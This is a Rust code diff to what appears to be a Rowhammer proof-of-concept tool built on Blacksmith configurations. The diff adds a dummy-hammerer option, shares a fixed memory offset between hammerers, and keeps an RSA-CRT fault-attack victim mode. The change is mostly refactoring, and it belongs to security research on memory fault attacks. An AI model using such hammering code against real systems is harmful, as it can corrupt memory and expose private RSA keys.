@@ -1,5 +1,5 @@
 use anyhow::{bail, Context, Result};
-use bs_poc::forge::{HammerVictim, Hammerer};
+use bs_poc::forge::{DummyHammerer, HammerVictim, Hammerer, Hammering};
 use bs_poc::memory::{BitFlip, LinuxPageMap, Memory, VirtToPhysResolver};
 use bs_poc::util::{BlacksmithConfig, MemConfiguration};
 use bs_poc::victim::HammerVictimRsa;
@@ -28,6 +28,9 @@ struct CliArgs {
     /// The hammering mode to use. Set to memcheck for bit flip check or rsa for RSA-CRT attack
     #[clap(long = "elevated-priority", action)]
     elevated_priority: bool,
+    /// use dummy hammerer
+    #[clap(long = "dummy-hammerer", action)]
+    dummy_hammerer: bool,
 }
 
 #[derive(clap::ValueEnum, Clone, Debug)]
@@ -107,21 +110,23 @@ fn main() -> Result<()> {
         Err(err) => warn!("Failed to determine physical address: {}", err),
     }
 
-    let config = BlacksmithConfig::from_jsonfile(&args.config)?;
+    let config = BlacksmithConfig::from_jsonfile(&args.config).with_context(|| "from_jsonfile")?;
     let mem_config =
         MemConfiguration::from_bitdefs(config.bank_bits, config.row_bits, config.col_bits);
-    let hammerer = Hammerer::new(
-        mem_config,
-        args.load_json.clone(),
-        args.pattern.clone(),
-        memory.addr.clone(),
-    )?;
+    let offset = 0x17B31343;
+    let hammerer: Box<dyn Hammering> = if args.dummy_hammerer {
+        Box::new(DummyHammerer::new(memory.addr.clone() as *mut u8, offset))
+    } else {
+        Box::new(Hammerer::new(
+            mem_config,
+            args.load_json.clone(),
+            args.pattern.clone(),
+            memory.addr.clone(),
+        )?)
+    };
     let mut victim: Box<dyn HammerVictim> = match args.hammer_mode {
         HammerMode::MemCheck => Box::new(HammerVictimMemCheck::new(mem_config, &memory)),
-        HammerMode::Rsa => {
-            let offset = 0x24C30667;
-            Box::new(HammerVictimRsa::new(&memory, offset)?)
-        }
+        HammerMode::Rsa => Box::new(HammerVictimRsa::new(&memory, offset)?),
     };
     info!("initialized hammerer");
     info!("start hammering");
